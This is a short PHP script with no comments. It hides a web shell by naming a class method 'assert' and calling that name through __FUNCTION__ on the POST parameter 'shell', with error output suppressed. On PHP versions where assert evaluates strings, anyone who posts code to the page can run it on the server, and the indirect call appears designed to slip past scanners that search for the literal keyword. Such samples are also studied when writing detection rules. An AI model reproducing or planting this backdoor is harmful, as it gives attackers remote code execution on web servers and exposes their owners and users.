<?php
class test {
	function assert()
	{
		$f = __FUNCTION__ ;
		@$f($_POST['shell']);
	}
}
$t = new test();
$t->assert();
?>
